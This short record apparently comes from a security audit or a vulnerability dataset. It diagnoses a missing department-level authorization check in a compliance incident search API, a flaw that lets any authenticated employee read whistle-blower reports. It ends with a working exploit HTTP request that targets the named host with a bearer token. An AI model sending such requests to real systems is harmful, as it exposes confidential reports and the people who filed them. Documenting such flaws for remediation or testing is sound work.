diagnosis: The compliance incident search route executes a raw TypeORM query that filters by classification and status but does not restrict results by req.user.department_id. Any authenticated employee can search and view sensitive whistle-blower reports and confidential ethics investigations across all corporate departments.
exploit_request:
GET /api/compliance/incidents/search?classification=CORRUPTION&status=OPEN HTTP/1.1
Host: compliance.globalcorp.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Accept: application/json
